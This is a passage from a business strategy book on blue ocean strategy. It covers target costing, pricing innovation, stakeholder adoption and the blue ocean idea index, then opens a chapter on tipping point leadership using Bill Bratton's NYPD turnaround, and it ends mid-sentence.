key.\nThe price corridor of the target mass not only signals the strategic pricing\nzone central to pulling in an ocean of new demand but also signals how you\nmight need to adjust your initial price estimates to achieve this. When your\noffering passes the test of strategic pricing, you’re ready to move to the next\nstep.\nFrom Strategic Pricing to Target Costing\n\nTarget costing, the next step in the strategic sequence, addresses the profit\nside of the business model. To maximize the profit potential of a blue ocean\nidea, a company should start with the strategic price and then deduct its\ndesired profit margin from the price to arrive at the target cost. Here, price-\nminus costing, and not cost-plus pricing, is essential if you are to arrive at a\ncost structure that is both profitable and hard for potential followers to\nmatch.\n\nWhen target costing is driven by strategic pricing, however, it is usually\naggressive. Part of the challenge of meeting the target cost is addressed in\nbuilding a strategic profile that has not only divergence but also focus, which\nmakes a company strip out costs. Think of the cost reductions Cirque du\nSoleil enjoyed by eliminating animals and stars or that Ford enjoyed by\nmaking the Model T in one color and one model having few options.\n\nSometimes these reductions are sufficient to hit the cost target, but often\nthey are not. Consider the cost innovations that Ford had to introduce to\nmeet its aggressive target cost for the Model T. Ford had to scrap the\nstandard manufacturing system, in which cars were handmade by skilled\ncraftsmen from start to finish. Instead, Ford introduced the assembly line,\nwhich replaced skilled craftsmen with ordinary unskilled laborers, who\nworked one small task faster and more efficiently, cutting the time to make a\nModel T from twenty-one days to four days and cutting labor hours by 60\npercent.* Had Ford not introduced these cost innovations, it could not have\nmet its strategic price profitably.\n\nInstead of drilling down and finding ways to creatively meet the target\ncost as Ford did, if companies give in to the tempting route of either\nbumping up the strategic price or cutting back on utility, they are not on the\npath to lucrative blue waters. To hit the cost target, companies have three\nprincipal levers.\n\nThe first involves streamlining operations and introducing cost\ninnovations from manufacturing to distribution. Can the product’s or\nservice’s raw materials be replaced by unconventional, less expensive ones\n—such as switching from metal to plastic or shifting a call center from the\nUK to Bangalore? Can high-cost, low-value-added activities in your value\nchain be significantly eliminated, reduced, or outsourced? Can the physical\nlocation of your product or service be shifted from prime real estate\nlocations to lower-cost locations, as The Home Depot, IKEA, and Walmart\nhave done in retail or Southwest Airlines has done by shifting from major to\nsecondary airports? Can you truncate the number of parts or steps used in\nproduction by shifting the way things are made, as Ford did by introducing\nthe assembly line? Can you digitize activities to reduce costs?\n\nBy probing questions such as these, the Swiss watch company Swatch, for\nexample, was able to arrive at a cost structure some 30 percent lower than\nany other watch company in the world. At the start, Nicolas Hayek,\nchairman of Swatch, set up a project team to determine the strategic price for\nthe Swatch. At the time, cheap (about $75), high-precision quartz watches\nfrom Japan and Hong Kong were capturing the mass market. Swatch set the\nprice at $40, a price at which people could buy multiple Swatches as fashion\naccessories. The low price left no profit margin for Japanese or Hong Kong—\nbased companies to copy Swatch and undercut its price. Directed to sell the\nSwatch for that price and not a penny more, the Swatch project team worked\nbackwards to arrive at the target cost, a process that involved determining\nthe margin Swatch needed to support marketing and services and earn a\nprofit.\n\nGiven the high cost of Swiss labor, Swatch was able to achieve this goal\nonly by making radical changes in the product and production methods.\nInstead of using the more traditional metal or leather, for example, Swatch\nused plastic. Swatch’s engineers also drastically simplified the design of the\nwatch’s inner workings, reducing the number of parts from one hundred fifty\nto fifty-one. Finally, the engineers developed new and cheaper assembly\ntechniques; for example, the watch cases were sealed by ultrasonic welding\ninstead of screws. Taken together, the design and manufacturing changes\nenabled Swatch to reduce direct labor costs from 30 percent to less than 10\npercent of total costs. These cost innovations produced a cost structure that\nwas hard to beat and let Swatch profitably dominate the mass market for\nwatches, a market previously dominated by Asian manufacturers with a\ncheaper labor pool.\n\nBeyond streamlining operations and introducing cost innovations, a\nsecond lever companies can pull to meet their target cost is partnering. In\nbringing a new product or service to market, many companies mistakenly try\nto carry out all the production and distribution activities themselves.\nSometimes that’s because they see the product or service as a platform for\ndeveloping new capabilities. Other times it is simply a matter of not\nconsidering other outside options. Partnering, however, provides a way for\ncompanies to secure needed capabilities fast and effectively while dropping\ntheir cost structure. It allows a company to leverage other companies’\nexpertise and economies of scale. Partnering includes closing gaps in\ncapabilities through making small acquisitions when doing so is faster and\ncheaper, providing access to needed expertise that has already been\nmastered.\n\nA large part of IKEA’s ability to meet its target cost, for example, comes\ndown to partnering. IKEA seeks out the lowest prices for materials and\nproduction via partnering with some two thousand manufacturing companies\nin more than fifty countries to ensure the lowest cost and fastest production\nof products in its IKEA lineup of some twenty thousand items.\n\nOr consider German-based SAP, which after forty years remains the\nworld’s leading business application software maker. By partnering with\nOracle at its outset, SAP saved hundreds of millions if not billions of dollars\nin development costs and got a world-class central database, namely\nOracle’s, which sat at the heart of SAP’s first two blue oceans, namely R/2\nand later R/3. SAP went a step further and also partnered with leading\nconsulting firms, such as Capgemini and Accenture, to gain quick access to a\nglobal sales force and implementation team at no extra cost. Whereas Oracle\nhad the fixed costs of a much smaller sales force on its balance sheet, SAP\nleveraged Capgemini’s and Accenture’s strong global networks to rapidly\nreach SAP’s target customers, with no cost implication to the company. SAP\ncontinues to maintain a very extensive ecosystem today, with partners\nplaying a critical role in helping organizations identify, purchase, and\nimplement SAP solutions.\n\nSometimes, however, no amount of streamlining and cost innovation or\npartnering will make it possible for a company to deliver its target cost. This\nbrings us to the third lever companies can use to make their desired profit\nmargin without compromising their strategic price: changing the pricing\nmodel of the industry. By changing the pricing model used—and not the\nlevel of the strategic price—companies can often overcome this problem.\nNetJets, for example, changed the pricing model of jets to time-share to\nprofitably deliver on its strategic price. The New Jersey company follows\nthis model to make jets accessible to a wide range of corporate customers\nand wealthy individuals, who buy the right to use a jet for a certain amount\nof time rather than buy the jet itself, which would have greatly truncated the\ndemand it could have unlocked. Another model is the slice-share; mutual\nfund managers, for example, bring high-quality portfolio services—\ntraditionally provided by private banks to the rich—to the small investor by\nselling a sliver of the portfolio rather than its whole. Freemium is yet another\npricing strategy some companies are using by which a product or service\n(typically a digital offering such as software, media, games, or web services)\nis provided free of charge to pull in the target mass, but a premium is\ncharged for proprietary features, functionality, or virtual goods. By being\nboth “free” and “premium,” companies are striving to be strategically priced\nto capture the target mass while earning profit for the premium features\nthose users, having used the product or service, will feel compelled to buy\nand upgrade to. These are all examples of pricing innovation. Remember,\nhowever, that what is a pricing innovation for one industry is often a\nstandard pricing model in another industry. When IBM, for example,\nexploded the tabulating market, it did so by shifting the pricing model of the\nindustry from selling to leasing to hit its strategic price while covering its\ncost structure.\n\nFigure 6-6 shows how value innovation typically maximizes profit by\nusing the foregoing three levers. As the figure depicts, a company begins\nwith its strategic price, from which it deducts its target profit margin to\narrive at its target cost. To hit the cost target that supports that profit,\ncompanies have two key levers: one is streamlining and cost innovations,\nand the other is partnering. When the target cost cannot be met despite all\nefforts to build a low-cost business model, the company should turn to the\nthird lever, pricing innovation, to profitably meet the strategic price. Of\ncourse, even when the target cost can be met, pricing innovation still can be\npursued. When a company’s offering successfully addresses the profit side of\nthe business model, the company is ready to advance to the final step in the\nsequence of blue ocean strategy.\n\nFIGURE 6-6\nThe profit model of blue ocean strategy\n\nThe strategic price\n\n| The target a,\n\nThe target cost\n\nStreamlining and\ncost innovations\n\nPartnering\n\nPricing innovation\n\nA business model built in the sequence of exceptional utility, strategic\npricing, and target costing produces value innovation. Unlike the practice of\nconventional technology innovators, value innovation is based on a win-win\ngame among buyers, companies, and society. Appendix C, “The Market\nDynamics of Value Innovation,” illustrates how such a game is played out in\n\nthe market and shows the economic and social welfare implications for its\nstakeholders.\nFrom Utility, Price, and Cost to Adoption\n\nEven an unbeatable business model may not be enough to guarantee the\ncommercial success of a blue ocean idea. Almost by definition, it threatens\nthe status quo, and for that reason it may provoke fear and resistance among\na company’s three main stakeholders: its employees, its business partners,\nand the general public. Before plowing forward and investing in the new\nidea, the company must first overcome such fears by educating the fearful.\nEmployees\n\nFailure to adequately address the concerns of employees about the impact\nof a new business idea on their work and livelihoods can be expensive.\nWhen Merrill Lynch’s management, for example, announced plans to create\nan online brokerage service, its stock price fell by 14 percent as reports\nemerged of resistance and infighting within the company’s large retail\nbrokerage division.\n\nBefore companies go public with an idea and set out to implement it,\nthey should make a concerted effort to communicate to employees that they\nare aware of the threats posed by the execution of the idea. Companies\nshould work with employees to find ways of defusing the threats so that\neveryone in the company wins, despite shifts in people’s roles,\nresponsibilities, and rewards. In contrast to Merrill Lynch, consider Netflix,\nwhich faced the difficult task of reinventing itself from a DVD-by-mail\nbusiness to providing video streaming. To achieve this transformation,\nNetflix has put great emphasis on engaging employees on the necessity of\nthe shift, explaining what this means to them, and preparing them for\nchange, including, for example, making sure employees understand the\nlevers that drive the video-streaming business. The results to date have been\npositive, with the company adding new customers at a steady rate, pushing\nNetflix’s subscribers above the forty million mark for the first time in 2013.\nBusiness Partners\n\nPotentially even more damaging than employee disaffection is the\nresistance of partners who fear that their revenue streams or market\npositions are threatened by a new business idea. That was the problem faced\nby SAP when it was developing its product AcceleratedSAP (ASAP), a\nmethodology for faster and lower-cost implementation of its enterprise\nsoftware system. ASAP brought business application software within the\nreach of midsized and small companies for the first time. The problem was\nthat the development of best-practice templates for ASAP required the\nactive cooperation of large consulting firms that were deriving substantial\nincome from lengthy implementations of SAP’s other products. As a result,\nthey were not necessarily incentivized to find the fastest way to implement\nthe company’s software.\n\nSAP resolved the dilemma by openly discussing the issues with its\npartners. Its executives convinced the consulting firms that they stood to\ngain more business by cooperating. Although ASAP would reduce\nimplementation time for small and midsized companies, consultants would\ngain access to a new client base that would more than compensate for some\nlost revenues from larger companies. The new system would also offer\nconsultants a way to respond to customers’ increasingly vocal concerns that\nbusiness application software took too long to implement. ASAP’s success\nwas a critical step on SAP’s journey to provide business application\nsoftware to not only large corporations but also to midsized and small\norganizations as well.\nThe General Public\n\nOpposition to a new business idea can also spread to the general public,\nespecially if the idea threatens established social or political norms. The\neffects can be dire. Consider Monsanto, which makes genetically modified\ncrop seeds. Its intentions were initially questioned by European consumers,\nlargely because of the efforts of environmental groups such as Greenpeace,\nFriends of the Earth, and the Soil Association. The attacks of these groups\nstruck many chords in Europe, which has a history of environmental\nconcern and powerful agricultural lobbies. Since then, the debate on\ngenetically modified foods has grown and spread around the globe, with\nMonsanto often at the heart of the attacks.\n\nWhile the issue of genetically modified foods is a large one, Monsanto’s\nmistake has been to let others take charge of the debate. The company\nshould have proactively educated the environmental groups as well as the\npublic on the potential of genetically modified seeds to lower food costs\nand eliminate world famine and disease through, for example, drought\ntolerance and nutrition enhancement. When the products came out,\nMonsanto should have given consumers a choice between organic and\ngenetically modified foods by supporting the labeling of products that had\ngenetically modified seeds as their base. If Monsanto had taken these steps,\nlistened to the objections and tried to provide solutions that responded to\npeople’s concerns like forthright mandatory labeling, then instead of being\nvilified, it might have engendered more trust by the public and even ended\nup being seen in a positive light as the provider of a technology that is\nworking to help eliminate famine and disease through enhanced seeds.\n\nIn educating these three groups of stakeholders—your employees, your\npartners, and the general public—the key challenge is to engage in an open\ndiscussion about why the adoption of the new idea is necessary. You need to\nexplain its merits, set clear expectations for its ramifications, and describe\nhow the company will address them. Stakeholders need to know that their\nvoices have been heard and that there will be no surprises. Companies that\ntake the trouble to have such a dialogue with stakeholders will find that it\namply repays the time and effort involved. (For a fuller discussion of how\ncompanies can engage internal and external stakeholders, see chapter 8.)\nThe Blue Ocean Idea Index\nAlthough companies should build their blue ocean strategy in the sequence\nof utility, price, cost, and adoption, these criteria form an integral whole to\n\nensure commercial success. The blue ocean idea (0801) index provides a\nsimple but robust test of this system view (see figure 6-7).\n\nFIGURE 6-7\n\nBlue ocean idea (BOD) index\n\nDoCoMo\nPhilips | Motorola| i-mode\nCD-i lridium | Japan\n\nIs there exceptional utility? Are there\ncompelling reasons to buy your offering?\n\nIs your price easily accessible to the\n\ntarget mass of buyers?\n\nDoes your cost structure meet the\ntarget cost?\n\nAdoption | Have you addressed adoption hurdles\nup front?\n\nAs shown in figure 6-7, had Philips’ CD-i and Motorola’s Iridium scored\ntheir ideas on the BOI index, they would have seen how far they were from\nopening up lucrative blue oceans. With respect to Philips CD-i, it did not\ncreate exceptional buyer utility with its offering of complex technological\nfunctions and limited software titles. It was priced out of reach of the target\n\nmass of buyers, and its manufacturing process was complicated and costly.\nWith its complicated design, it took more than thirty minutes to explain and\nsell to customers, something that gave no incentive for sales clerks to sell\nCD-i in fast-moving retail. Philips CD-i therefore failed all four criteria on\nthe BOI index despite the billions poured into it.\n\nBy assessing the business idea of the CD-i against the BOI index during\ndevelopment, Philips could have foreseen the shortcomings embedded in the\nidea and addressed them up front by simplifying the product and locking in\npartners to develop winning software titles, setting a strategic price\naccessible to the target mass, instituting price-minus costing instead of cost-\nplus pricing, and working with retail to find a simple, easy way for the sales\nforce to sell and explain the product in a few minutes.\n\nSimilarly, Motorola’s Iridium was unreasonably expensive because of\nhigh production costs. It provided no attractive utility for the target mass of\nbuyers, not being usable in buildings or cars and being the size of a brick.\nWhen it came to adoption, Motorola overcame many regulations and secured\ntransmission rights from numerous countries. Employees, partners, and the\nsociety were also reasonably motivated to accept the idea. But the company\nhad a weak sales team and marketing channels in the global markets.\nBecause Motorola was not able to follow up sales leads effectively, Iridium\nphone sets were sometimes unavailable when requested. Weak utility, price,\nand cost positions, plus average adoption ability, indicated that the Iridium\nidea would be a flop.\n\nIn contrast to these failures, consider NTT DoCoMo’s i-mode launch in\nJapan. While most telecom operators were focused on technology races and\nprice competition over voice-based wireless devices, NTT DoCoMo, the\nlargest Japanese telecom operator, launched i-mode to offer the internet on\ncell phones. The i-mode was the world’s first smart phone to achieve mass\nadoption by a country.\n\nBefore i-mode, regular mobile telephony in Japan had reached a high level\nof sophistication in terms of mobility, quality of voice, ease of use, and\nhardware design. However, like the mobile phone industry across the globe\nat the time, it offered few data-based services such as e-mail, access to\ninformation, news, and games, and transaction capabilities, which were the\nkiller applications of the internet world. The i-mode service changed that. It\nbrought together the key advantages of these two alternative industries—the\ncell phone industry and the internet industry—and created unique and\nsuperior buyer utility.\n\nThe i-mode service offered exceptional buyer utility at a price accessible\nto the target mass of buyers in Japan. The monthly i-mode subscription fee,\nthe voice and data transmission fee, and the price of content were in the\n“nonreflection” strategic price zone, encouraging impulse buying and\nreaching the masses as quickly as possible. For example, the monthly\nsubscription fee for a content site was roughly the same as the price of the\nmost popular weekly magazines Japanese regularly pick up at their train\nstation kiosk.\n\nAfter setting a price that was attractive to the mass of target buyers, NTT\nDoCoMo strove to obtain the capabilities it needed to deliver the service\nwithin its cost target in order to turn a profit. In achieving this end, the\ncompany was never bounded by its own assets and capabilities. While it\nfocused on its traditional role as an operator to develop and maintain a high-\nspeed, high-capacity network in the i-mode project, it sought to deliver other\nkey elements of its offering by actively partnering with handset\nmanufacturers and information providers.\n\nBy creating a win-win partnership network, the company aimed to meet\nand sustain the target cost set by its strategic price. Although there are many\npartners and dimensions involved in its partnership network, a few aspects\nare particularly relevant here. First, NTT DoCoMo regularly and persistently\nshared know-how and technology with its handset-manufacturing partners to\nhelp them stay ahead of their competitors. Second, the company played the\nrole of the portal and gateway to the wireless network, expanding and\nupdating the list of i-mode menu sites while attracting content providers to\njoin the i-mode list and create content that would boost user traffic. By\nhandling the billing for the content providers with a small commission fee,\nfor example, the company offered content providers major cost savings\nassociated with billing system development. At the same time DoCoMo also\nobtained a growing revenue stream for itself.\n\nMore importantly, instead of using the Wireless Markup Language\n(WML) under the WAP standard for site creation, i-mode used c-HTML, an\nexisting and already widely used language in Japan. This made i-mode more\nattractive to content providers because under c-HTML, software engineers\nneeded no retraining to convert their existing websites, designed for the\ninternet environment, into sites for i-mode use, and thus they incurred no\nadditional costs. NTT DoCoMo also entered into collaborative arrangements\nwith key foreign partners, such as Microsoft, to reduce the total development\ncosts and shorten the time for an effective launch.\n\nAnother key aspect of the i-mode strategy was the way the project was\ncarried out. A team specially dedicated to the project was set up and given a\nclear mandate and autonomy. The head of the i-mode team selected most of\nthe team members and engaged them in an open discussion on how to create\nthe new market of mobile data communications, making them committed to\nthe project. All this created a favorable corporate environment for the\nadoption of i-mode. Moreover, the win-win game the company created for\nits partners, as well as the readiness of the Japanese general public to use\ndatabase services, also contributed to the successful adoption of i-mode.\n\nThe i-mode service passed all four criteria on the BOI index, as shown\nearlier in figure 6-7. Indeed, i-mode turned out to be an explosive success.\n\nHaving passed the blue ocean idea index, companies are ready to shift\ngears from the formulation side of blue ocean strategy to its execution. The\nquestion is, How do you bring an organization with you to execute this\nstrategy, even though it often represents a significant departure from the\npast? This brings us to the second part of this book, and the fifth principle of\nblue ocean strategy: overcoming key organizational hurdles, the subject of\nour next chapter.\nPART THREE\n“~*~\n\nExecuting Blue Ocean Strategy\nCHAPTER 7\n\nOvercome Key Organizational Hurdles\n\nONcE A COMPANY HAS DEVELOPED a blue ocean strategy with a profitable\nbusiness model, it must execute it. The challenge of execution exists, of\ncourse, for any strategy. Companies, like individuals, often have a tough\ntime translating thought into action whether in red or blue oceans. But\ncompared with red ocean strategy, blue ocean strategy represents a\nsignificant departure from the status quo. It hinges on a shift from\nconvergence to divergence in value curves at lower costs. That raises the\nexecution bar.\n\nManagers have assured us that the challenge is steep. They face four\nhurdles. One is cognitive: waking employees up to the need for a strategic\nshift. Red oceans may not be the paths to future profitable growth, but they\nfeel comfortable to people and may have even served an organization well\nuntil now, so why rock the boat?\n\nThe second hurdle is limited resources. The greater the shift in strategy,\nthe greater it is assumed are the resources needed to execute it. But\nresources were being cut, and not raised, in many of the organizations we\nstudied.\n\nThird is motivation. How do you motivate key players to move fast and\ntenaciously to carry out a break from the status quo? That will take years,\nand managers don’t have that kind of time.\n\nThe final hurdle is politics. As one manager put it, “In our organization\nyou get shot down before you stand up.”\nAlthough all companies face different degrees of these hurdles, and many\nmay face only some subset of the four, knowing how to triumph over them\nis key to attenuating organizational risk. This brings us to the fifth principle\nof blue ocean strategy: overcome key organizational hurdles to make blue\nocean strategy happen in action.\n\nTo achieve this effectively, however, companies must abandon perceived\nwisdom on effecting change. Conventional wisdom asserts that the greater\nthe change, the greater the resources and time you will need to bring about\nresults. Instead, you need to flip conventional wisdom on its head using\nwhat we call tipping point leadership. Tipping point leadership allows you\nto overcome these four hurdles fast and at low cost while winning\nemployees’ backing in executing a break from the status quo.!\nTipping Point Leadership in Action\n\nConsider the New York City Police Department (NYPD), which executed a\nblue ocean strategy in the public sector. When Bill Bratton was first\nappointed police commissioner of New York City, the odds were stacked\nagainst him to an extent few executives ever face. At the time, New York\nCity was veering toward anarchy. Murders were at an all-time high.\nMuggings, Mafia hits, and armed robberies filled the daily headlines. New\nYorkers were under siege. But Bratton’s budget was frozen. Indeed, after\nthree decades of mounting crime in New York City, many social scientists\nhad concluded that it was impervious to police intervention. The citizens of\nNew York City were crying out. With miserable pay, dangerous working\nconditions, long hours, and little hope of advancement in a tenure promotion\nsystem, morale among the NYPD’s thirty-six thousand officers was at rock\nbottom—not to mention the debilitating effects of budget cuts, dilapidated\nequipment, and corruption.\n\nIn business terms, the NYPD was a cash-strapped organization with\nthirty-six thousand employees wedded to the status quo, unmotivated, and\nunderpaid; a disgruntled customer base—New York City’s citizens; and\nrapidly declining performance as measured by the increase in crime, fear,\nand disorder. Entrenched turf wars and politics topped off the cake. In short,\nleading the NYPD to execute a shift in strategy was a managerial nightmare\nfar beyond the imaginations of most executives. The competition—the\ncriminals—was strong and rising.\n\nYet in less than two years and without an increase in his budget, Bratton\nturned New York City into the safest large city in the United States. He\nbroke out of the red ocean with a blue ocean policing strategy that\nrevolutionized US policing as it was then known. The organization won as\n“profits” jumped: felony crime fell 39 percent, murders 50 percent, and theft\n35 percent. “Customers” won: Gallup polls reported that public confidence\nin the NYPD leaped from 37 percent to 73 percent. And employees won:\ninternal surveys showed job satisfaction in the NYPD reaching an all-time\nhigh. As one patrolman put it, “We would have marched to hell and back for\nthat guy.” Perhaps most impressively, the changes have outlasted its leader,\nwith crime rates continuing to fall after the leader’s departure, implying a\nfundamental shift in the organizational culture and strategy of the NYPD.\nWhile the current environmental and political circumstances the NYPD\nfaces differ greatly from then, Bill Bratton was reappointed police\ncommissioner of New York in 2014.\n\nFew corporate leaders face organizational hurdles as steep as Bratton did\nin executing a break from the status quo. And still fewer are able to\norchestrate the type of performance leap that Bratton achieved under any\norganizational conditions, let alone those as stringent as he encountered.\nEven Jack Welch needed some ten years and tens of millions of dollars of\nrestructuring and training to transform GE.\n\nMoreover, defying conventional wisdom, Bratton achieved these\nbreakthrough results in record time with scarce resources while lifting\nemployee morale, creating a win-win for all involved. Nor was this Bratton’s\nfirst strategic reversal. It was his fifth, with each of the others also achieved\ndespite his facing all four hurdles that managers consistently claim limit\ntheir ability to execute blue ocean strategy: the cognitive hurdle that blinds\nemployees from seeing that radical change is necessary; the resource hurdle\nthat is endemic in firms; the motivational hurdle that discourages and\ndemoralizes staff; and the political hurdle of internal and external resistance\nto change (see figure 7-1).\n\nFIGURE 7-1\n\nThe four organizational hurdles to strategy execution\nCognitive hurdle\n\nAn organization\nwedded to the\nstatus quo\n\nPolitical hurdle\n\nOpposition from\nLimited resources powerful vested\ninterests\n\nResource hurdle\n\nMotivational hurdle\nUnmotivated staff\n\nThe Pivotal Lever: Disproportionate Influence\nFactors\n\nThe key to tipping point leadership is concentration, not diffusion. Tipping\npoint leadership builds on the rarely exploited corporate reality that in every\norganization, there are people, acts, and activities that exercise a\ndisproportionate influence on performance. Hence, contrary to conventional\nwisdom, mounting a massive challenge is not about putting forth an equally\nmassive response where performance gains are achieved by proportional\ninvestments in time and resources. Rather, it is about conserving resources\nand cutting time by focusing on identifying and then leveraging the factors\nof disproportionate influence in an organization.\n\nThe key questions answered by tipping point leaders are as follows: What\nfactors or acts exercise a disproportionately positive influence on breaking\nthe status quo? On getting the maximum bang out of each buck of\nresources? On motivating key players to aggressively move forward with\nchange? And on knocking down political roadblocks that often trip up even\nthe best strategies? By single-mindedly focusing on points of\ndisproportionate influence, tipping point leaders can topple the four hurdles\nthat limit execution of blue ocean strategy. They can do this fast and at low\ncost.\n\nLet us consider how you can leverage disproportionate influence factors\nto tip all four hurdles to move from thought to action in the execution of\nblue ocean strategy.\nBreak through the Cognitive Hurdle\n\nIn many turnarounds and corporate transformations, the hardest battle is\nsimply to make people aware of the need for a strategic shift and to agree\non its causes. Most CEOs will try to make the case for change simply by\npointing to the numbers and insisting that the company set and achieve\nbetter results: “There are only two performance alternatives: to make the\nperformance targets or to beat them.”\n\nBut as we all know, figures can be manipulated. Insisting on stretch goals\nencourages abuse in the budgetary process. This, in turn, creates hostility\nand suspicion between the various parts of an organization. Even when the\nnumbers are not manipulated, they can mislead. Salespeople on\ncommission, for example, are seldom sensitive to the costs of the sales they\nproduce.\n\nWhat’s more, messages communicated through numbers seldom stick\nwith people. The case for change feels abstract and removed from the\nsphere of the line managers, who are the very people the CEO needs to win\nover. Those whose units are doing well feel that the criticism is not directed\nat them; the problem is top management’s. Meanwhile, managers of poorly\nperforming units feel that they are being put on notice, and people who are\nworried about personal job security are more likely to scan the job market\nthan to try to solve the company’s problems.\n\nTipping point leadership does not rely on numbers to break through the\norganization’s cognitive hurdle. To tip the cognitive hurdle fast, tipping\npoint leaders such as Bratton zoom in on the act of disproportionate\ninfluence: making people see and experience harsh reality firsthand.\nResearch in neuroscience and cognitive science shows that people\nremember and respond most effectively to what they see and experience:\n“Seeing is believing.” In the realm of experience, positive stimuli reinforce\nbehavior, whereas negative stimuli change attitudes and behavior. Simply\nput, if a child puts a finger in icing and tastes it, the better it tastes the more\nthe child will taste it repetitively. No parental advice is needed to encourage\nthat behavior. Conversely, after a child puts a finger on a burning stove, he\nor she will never do it again. After a negative experience, children will\nchange their behavior of their own accord; again, no parental pestering is\nrequired.” On the other hand, experiences that don’t involve touching,\nseeing, or feeling actual results, such as being presented with an abstract\nsheet of numbers, are shown to be non-impactful and easily forgotten.*\n\nTipping point leadership builds on this insight to inspire a fast change in\nmind-set that is internally driven of peoples own accord. Instead of relying\non numbers to tip the cognitive hurdle, they make people experience the\nneed for change in two ways.\nRide the “Electric Sewer”\n\nTo break the status quo, employees must come face-to-face with the worst\noperational problems. Don’t let top brass, middle brass, or any brass\nhypothesize about reality. Numbers are disputable and uninspiring, but\ncoming face-to-face with poor performance is shocking and inescapable,\nbut actionable. This direct experience exercises a disproportionate influence\non tipping people’s cognitive hurdle fast.\n\nConsider this example. In the 1990s the New York subway system reeked\nof fear, so much so that it earned the epithet “electric sewer.” Revenues\nwere tumbling fast as citizens boycotted the system. But members of the\nNew York City Transit Police department were in denial. Why? Only 3\npercent of the city’s major crimes happened on the subway. So no matter\nhow much the public cried out, their cries fell on deaf ears. There was no\nperceived need to rethink police strategies.\n\nThen Bratton was appointed chief, and in a matter of weeks he\norchestrated a complete break from the status quo in the mind-set of the\ncity’s police. How? Not by force, nor by arguing for numbers, but by\nmaking top brass and middle brass—starting with himself—ride the electric\nsewer day and night. Until Bratton came along, that had not been done.\n\nAlthough the statistics may have told the police that the subway was safe,\nwhat they now saw was what every New Yorker faced every day: a subway\nsystem on the verge of anarchy. Gangs of youths patrolled the cars, people\njumped turnstiles, and the riders faced graffiti, aggressive begging, and\nwinos sprawled over benches. The police could no longer evade the ugly\ntruth. No one could argue that current police strategies didn’t require a\nsubstantial departure from the status quo—and fast.\n\nShowing the worst reality to your superiors can also shift their mind-set\nfast. A similar approach works to help sensitize superiors to a leader’s needs\nfast. Yet few leaders exploit the power of this rapid wake-up call. Rather,\nthey do the opposite. They try to garner support based on a numbers case\nthat lacks urgency and emotional impetus. Or they try to put forth the most\nexemplary case of their operational excellence to garner support. Although\nthese alternatives may work, neither leads to tipping superiors’ cognitive\nhurdle as fast and stunningly as showing the worst.\nWhen Bratton, for example, was running the police division of the\nMassachusetts Bay Transportation Authority (MBTA), the MBTA board\ndecided to purchase small squad cars that would be cheaper to buy and to\nrun. That went against Bratton’s new policing strategy. Instead of fighting\nthe decision, however, or arguing for a larger budget—something that\nwould have taken months to reevaluate and probably would have been\nrejected in the end—Bratton invited the MBTA’s general manager for a tour\nof his unit to see the district.\n\nTo let the general manager see the horror he was trying to rectify, Bratton\npicked him up in a small car just like the ones that were being ordered. He\njammed the seats up front to let the manager feel how little legroom a six-\nfoot cop would get, and then Bratton drove over every pothole he could.\nBratton also put on his belt, cuffs, and gun for the trip so that the manager\nwould see how little space there was for the tools of the police officer’s\ntrade. After two hours, the general manager wanted out. He told Bratton he\ndidn’t know how Bratton could stand being in such a cramped car for so\nlong on his own, never mind having a criminal in the backseat. Bratton got\nthe larger cars his new strategy demanded.\nMeet with Disgruntled Customers\n\nTo tip the cognitive hurdle, not only must you get your managers out of the\noffice to see operational horror, but you also must get them to listen to their\nmost disgruntled customers firsthand. Don’t rely on market surveys. To\nwhat extent does your top team actively observe the market firsthand and\nmeet with your most disgruntled customers to hear their concerns? Do you\never wonder why sales don’t match your confidence in your product?\nSimply put, there is no substitute for meeting and listening to dissatisfied\ncustomers directly.\n\nIn the late 1970s, Boston’s Police District 4, which housed the Symphony\nHall, Christian Science Mother Church, and other cultural institutions, was\nexperiencing a serious surge in crime. The public was increasingly\nintimidated; residents were selling their homes and leaving, thereby pushing\nthe community into a downward spiral. But even though the citizens were\nleaving the area in droves, the police force under Bratton’s direction felt\nthey were doing a fine job. The performance indicators they historically\nused to benchmark themselves against other police departments were tip-\ntop: 911 response times were down, and felony crime arrests were up. To\nsolve the paradox Bratton arranged a series of town hall meetings between\nhis officers and the neighborhood residents.\n\nIt didn’t take long to find the gap in perceptions. Although the police\nofficers took great pride in short response times and their record in solving\nmajor crimes, these efforts went unnoticed and unappreciated by citizens;\nfew felt endangered by large-scale crimes. What they felt victimized by and\nharassed by were the constant minor irritants: winos, panhandlers,\nprostitutes, and graffiti.\n\nThe town meetings led to a complete overhaul of police priorities to\nfocus on the blue ocean strategy of “broken windows.” Crime went down,\nand the neighborhood felt safe again.\n\nWhen you want to wake up your organization to the need for a strategic\nshift and a break from the status quo, do you make your case with numbers?\nOr do you get your managers, employees, and superiors (and yourself) face-\nto-face with your worst operational problems? Do you get your managers to\nmeet the market and listen to disenchanted customers holler? Or do you\noutsource your eyes and send out market research questionnaires?\nJump the Resource Hurdle\n\nAfter people in an organization accept the need for a strategic shift and\nmore or less agree on the contours of the new strategy, most leaders are\nfaced with the stark reality of limited resources. Do they have the money to\nspend on the necessary changes? At this point, most reformist CEOs do one\nof two things. Either they trim their ambitions and demoralize their\nworkforce all over again, or they fight for more resources from their\nbankers and shareholders, a process that can take time and divert attention\nfrom the underlying problems. That’s not to say that this approach is not\nnecessary or worthwhile, but acquiring more resources is often a long,\npolitically charged process.\n\nHow do you get an organization to execute a strategic shift with fewer\nresources? Instead of focusing on getting more resources, tipping point\nleaders concentrate on multiplying the value of the resources they have.\nWhen it comes to scarce resources, there are three factors of\ndisproportionate influence that executives can leverage to dramatically free\nresources, on the one hand, and multiply the value of resources, on the\nother. These are hot spots, cold spots, and horse trading.\n\nHot spots are activities that have low resource input but high potential\nperformance gains. In contrast, cold spots are activities that have high\nresource input but low performance impact. In every organization, hot spots\nand cold spots typically abound. Horse trading involves trading your unit’s\nexcess resources in one area for another unit’s excess resources to fill\nremaining resource gaps. By learning to use their current resources right,\ncompanies often find they can tip the resource hurdle outright.\n\nWhat actions consume your greatest resources but have scant\nperformance impact? Conversely, what activities have the greatest\nperformance impact but are resource starved? When the questions are\nframed in this way, organizations rapidly gain insight into freeing up low-\nreturn resources and redirecting them to high-impact areas. In this way, both\nlower costs and higher value are simultaneously pursued and achieved.\nRedistribute Resources to Your Hot Spots\n\nAt the New York Transit Police, Bratton’s predecessors argued that to make\nthe city’s subways safe, they had to have an officer ride every subway line\nand patrol every entrance and exit. To increase profits (lower crime) would\nmean increasing costs (police officers) in multiples that were not possible\ngiven the budget. The underlying logic was that increments in performance\ncould be achieved only with proportional increments in resources—the\nsame inherent logic guiding most companies’ view of performance gains.\n\nBratton, however, achieved the sharpest drop in subway crime, fear, and\ndisorder in Transit’s history, not with more police officers but 